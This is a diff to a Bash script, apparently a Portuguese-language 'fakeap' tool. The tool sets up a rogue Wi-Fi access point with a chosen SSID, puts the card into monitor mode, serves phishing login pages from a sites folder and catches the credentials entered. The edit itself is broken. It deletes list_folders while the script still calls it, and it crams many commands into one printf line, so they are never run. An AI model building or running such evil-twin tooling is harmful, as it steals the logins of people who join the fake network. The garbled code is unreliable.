@@ -2,13 +2,9 @@
 
 trap 'printf "\n"; stop; exit 1' 2
 
-list_folders() {
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pastas disponíveis:\e[0m\n"
-  counter=1
-  for folder in sites/* ; do
-    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $folder
-    let counter++
-  done
+list_interfaces() {
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interfaces disponíveis:\e[0m\n"
+  iw dev | awk '$1=="Interface"{print $2}' | nl -n ln -w2 -s': '
 }
 
 dependencies() {
@@ -76,36 +72,25 @@ catch_cred() {
 }
 
 start() {
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha a interface de rede (ex: wlan0):\e[0m ' choosed_interface
+  list_interfaces
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha a interface de rede (ex: 1):\e[0m ' interface_number
+  choosed_interface=$(iw dev | awk '$1=="Interface"{print $2}' | sed -n "${interface_number}p")
   dependencies
   list_folders
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha um número de pasta:\e[0m ' folder_number
   use_site="sites/$(ls sites | sed -n "${folder_number}p")"
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Nome da rede (SSID) a ser usado:\e[0m ' use_ssid
   extract_login_info
   createpage
   stop
   sleep 2
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o ponto de acesso..\e[0m\n" 
   sleep 2
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" "$choosed_interface"
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Desativando %s\n" "$choosed_interface"
+  ip link set "$choosed_interface" down
   sleep 2
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\n" "$choosed_interface"
-  iw dev "$choosed_interface" set type monitor
-  sleep 2
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" "$choosed_interface"
-  ip link set "$choosed_interface" up
-  sleep 2
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface %s configurada com sucesso\n" "$choosed_interface"
-  sleep 2
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\e[0m\n"
-  sleep 2
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n"
-  sleep 2
-  server
-}
-
-case "$1" in --stop) stop ;; 
-*)
-start 
-;;
-esac
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\n" "$choosed_interface" iw dev "$choosed_interface" set type monitor sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ativando %s\n" "$choosed_interface" ip link set "$choosed_interface" up sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface %s configurada com sucesso\n" "$choosed_interface" sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\e[0m\n" sleep 2 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n" sleep 2 server }case "$1" in --stop) stop ;; 
+  *)
+  start
+  ;;
+  esac
